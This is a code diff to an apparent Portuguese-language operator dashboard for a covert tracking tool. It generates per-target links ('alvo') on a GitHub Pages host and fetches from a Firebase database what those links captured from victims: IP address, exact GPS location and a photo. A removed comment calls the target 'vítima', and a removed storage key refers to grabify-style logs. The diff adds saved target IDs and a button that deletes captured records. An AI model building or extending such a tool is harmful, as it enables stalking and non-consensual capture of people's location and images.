@@ -509,7 +509,7 @@
                     </div>
                 </div>
 
-                <div class="action-card" onclick="pedirIdCapturaRemota()">
+                <div class="action-card" onclick="abrirCapturaRemota()">
                     <div class="action-icon-wrapper">
                         <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
                     </div>
@@ -561,7 +561,7 @@
         let mapaIP = null;
         let marcadorIP = null;
         let mapaDetalhe = null;
-        let currentTargetId = "default"; // ID ativo no momento
+        let currentTargetId = localStorage.getItem('currentTargetId') || "alvo01"; // ID salvo permanentemente
 
         window.onload = function() {
             const savedName = localStorage.getItem('userName');
@@ -719,48 +719,31 @@
         }
 
         // ==========================================
-        // 1. PASSO DE PEDIR ID ANTES DE MOSTRAR O LINK
+        // CAPTURA REMOTA E GESTÃO DE ID NO FIREBASE
         // ==========================================
-        function pedirIdCapturaRemota() {
-            const modal = document.getElementById('app-modal');
-            document.getElementById('modal-title').textContent = "Configurar ID do Alvo";
-            modal.classList.add('active');
-
-            document.getElementById('modal-body').innerHTML = `
-                <div style="font-size: 0.85rem; color: #94a3b8; line-height: 1.4;">
-                    Digite um identificador (ex: <b>alvo01</b>, <b>joao</b> ou um código aleatório) para gerar o link personalizado:
-                </div>
-                <div class="search-box-container" style="margin-top: 6px;">
-                    <input type="text" id="input-custom-id" class="custom-input" value="${currentTargetId}" placeholder="Digite o ID...">
-                    <button class="custom-btn" onclick="confirmarIdEProsseguir()">Continuar</button>
-                </div>
-            `;
-        }
-
-        function confirmarIdEProsseguir() {
-            const val = document.getElementById('input-custom-id').value.trim();
-            if (!val) {
-                alert("Por favor, digite um ID válido.");
-                return;
+        function alterarIdAlvo() {
+            const novoId = prompt("Digite o novo ID do alvo:", currentTargetId);
+            if (novoId && novoId.trim() !== "") {
+                currentTargetId = novoId.trim();
+                localStorage.setItem('currentTargetId', currentTargetId);
+                abrirCapturaRemota();
             }
-            currentTargetId = val;
-            abrirCapturaRemotaComId(currentTargetId);
         }
 
-        // ==========================================
-        // 2. CAPTURA REMOTA CONECTADA AO FIREBASE
-        // ==========================================
-        async function abrirCapturaRemotaComId(idAlvo) {
+        async function abrirCapturaRemota() {
             const modal = document.getElementById('app-modal');
-            document.getElementById('modal-title').textContent = `CAPTURA REMOTA [ID: ${idAlvo}]`;
+            document.getElementById('modal-title').textContent = `CAPTURA REMOTA [ID: ${currentTargetId}]`;
             modal.classList.add('active');
 
-            const linkGerado = `https://wv0304362-bot.github.io/linkApi1-/?id=${idAlvo}`;
+            const linkGerado = `https://wv0304362-bot.github.io/linkApi1-/?id=${currentTargetId}`;
 
             let htmlContent = `
-                <button class="back-btn" onclick="pedirIdCapturaRemota()">&larr; Alterar ID</button>
+                <div style="display: flex; gap: 8px; align-items: center; justify-content: space-between;">
+                    <span style="font-size: 0.8rem; color: #94a3b8;">ID Atual: <b style="color: #38bdf8;">${currentTargetId}</b></span>
+                    <button class="custom-btn" style="padding: 4px 10px; font-size: 0.75rem; background: #334155;" onclick="alterarIdAlvo()">✏️ Editar ID</button>
+                </div>
                 
-                <div style="font-size: 0.8rem; color: #94a3b8;">Seu Link Modificado:</div>
+                <div style="font-size: 0.8rem; color: #94a3b8; margin-top: 4px;">Seu Link Modificado:</div>
                 <div class="search-box-container">
                     <input type="text" id="captura-link-input" class="custom-input" value="${linkGerado}" readonly>
                     <button class="custom-btn" onclick="copiarTexto('captura-link-input', 'Link copiado!')">Copiar</button>
@@ -768,7 +751,7 @@
 
                 <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 4px;">
                     <span style="font-size: 0.8rem; color: #94a3b8;">Dados Capturados no Firebase:</span>
-                    <button class="custom-btn" style="padding: 4px 12px; font-size: 0.75rem; background: #059669;" onclick="abrirCapturaRemotaComId('${idAlvo}')">🔄 Atualizar</button>
+                    <button class="custom-btn" style="padding: 4px 12px; font-size: 0.75rem; background: #059669;" onclick="abrirCapturaRemota()">🔄 Atualizar</button>
                 </div>
 
                 <div style="display: flex; flex-direction: column; gap: 8px; margin-top: 4px;" id="lista-captura-container">
@@ -779,24 +762,22 @@
 
             // Busca os dados no Firebase via requisição GET
             try {
-                let resposta = await fetch(`https://linkapi1-zrx-default-rtdb.firebaseio.com/capturas/${idAlvo}.json`);
+                let resposta = await fetch(`https://linkapi1-zrx-default-rtdb.firebaseio.com/capturas/${currentTargetId}.json`);
                 let dados = await resposta.json();
                 
                 const containerLista = document.getElementById('lista-captura-container');
 
                 if (!dados) {
-                    containerLista.innerHTML = `<div style="text-align: center; color: #64748b; padding: 15px;">Nenhum dado encontrado para o ID <b>${idAlvo}</b> ainda.</div>`;
+                    containerLista.innerHTML = `<div style="text-align: center; color: #64748b; padding: 15px;">Nenhum dado encontrado para o ID <b>${currentTargetId}</b> ainda.</div>`;
                     return;
                 }
 
-                // Descobre bandeira/país simulado ou com base no IP
                 let ipAlvo = dados.ip || "IP Desconhecido";
                 let lat = dados.location ? dados.location.lat : -14.235;
                 let lon = dados.location ? dados.location.lon : -51.925;
-                let fotoBase64 = dados.media ? dados.media.photo : "";
                 let timestamp = dados.timestamp || "Recente";
 
-                // Renderiza o card do IP capturado com bandeira e botão "Ver Dados"
+                // Renderiza o card do IP capturado com botões de "Ver Dados" e "Apagar" do lado
                 containerLista.innerHTML = `
                     <div class="log-item">
                         <div class="log-header-row">
@@ -812,8 +793,11 @@
                             <span>${timestamp}</span>
                         </div>
                         <div class="log-actions">
-                            <span style="font-size: 0.75rem; color: #94a3b8;">ID Firebase: ${idAlvo}</span>
-                            <button class="custom-btn" style="padding: 5px 12px; font-size: 0.75rem; background: #0284c7;" onclick='verDetalhesFirebase(${JSON.stringify(dados)}, "${idAlvo}")'>Ver Dados</button>
+                            <span style="font-size: 0.75rem; color: #94a3b8;">ID Firebase: ${currentTargetId}</span>
+                            <div style="display: flex; gap: 6px;">
+                                <button class="custom-btn" style="padding: 5px 10px; font-size: 0.75rem; background: #0284c7;" onclick='verDetalhesFirebase(${JSON.stringify(dados)}, "${currentTargetId}")'>Ver Dados</button>
+                                <button class="custom-btn" style="padding: 5px 10px; font-size: 0.75rem; background: #ef4444;" onclick="apagarDadosFirebase('${currentTargetId}')">Apagar</button>
+                            </div>
                         </div>
                     </div>
                 `;
@@ -824,8 +808,29 @@
             }
         }
 
+        // Função para apagar dados do Firebase usando requisição DELETE
+        async function apagarDadosFirebase(idAlvo) {
+            if (!confirm(`Tem certeza que deseja apagar os dados do ID [${idAlvo}] no Firebase?`)) return;
+
+            try {
+                let resposta = await fetch(`https://linkapi1-zrx-default-rtdb.firebaseio.com/capturas/${idAlvo}.json`, {
+                    method: 'DELETE'
+                });
+
+                if (resposta.ok) {
+                    alert("Dados apagados com sucesso!");
+                    abrirCapturaRemota(); // Atualiza a tela
+                } else {
+                    alert("Erro ao apagar os dados.");
+                }
+            } catch (erro) {
+                console.error("Erro ao deletar:", erro);
+                alert("Erro de conexão ao tentar apagar.");
+            }
+        }
+
         // ==========================================
-        // 3. TELA DE DETALHES DO ALVO COM MAPA E IMAGEM
+        // TELA DE DETALHES DO ALVO COM MAPA E IMAGEM
         // ==========================================
         function verDetalhesFirebase(dados, idAlvo) {
             let lat = dados.location ? dados.location.lat : -14.235;
@@ -835,7 +840,7 @@
 
             document.getElementById('modal-title').textContent = `Detalhes do Alvo [${idAlvo}]`;
             document.getElementById('modal-body').innerHTML = `
-                <button class="back-btn" onclick="abrirCapturaRemotaComId('${idAlvo}')">&larr; Voltar</button>
+                <button class="back-btn" onclick="abrirCapturaRemota()">&larr; Voltar</button>
                 
                 <div style="font-size: 0.9rem; font-weight: 600; color: #38bdf8;">IP do Alvo: 🇧🇷 ${ip}</div>
                 
@@ -851,7 +856,6 @@
                 </div>
             `;
 
-            // Inicializa o mapa centralizado nas coordenadas exatas recebidas da vítima
             setTimeout(() => {
                 if (mapaDetalhe) {
                     mapaDetalhe.remove();
@@ -867,12 +871,6 @@
                     .bindPopup(`<b>Alvo: ${ip}</b><br>Localização exata obtida via GPS.`)
                     .openPopup();
             }, 150);
-        }
-
-        function obterLogsSalvos() {
-            const salvos = localStorage.getItem('grabifyLogsCustom');
-            if (salvos) return JSON.parse(salvos);
-            return [];
         }
 
         function abrirBuscaLink() {
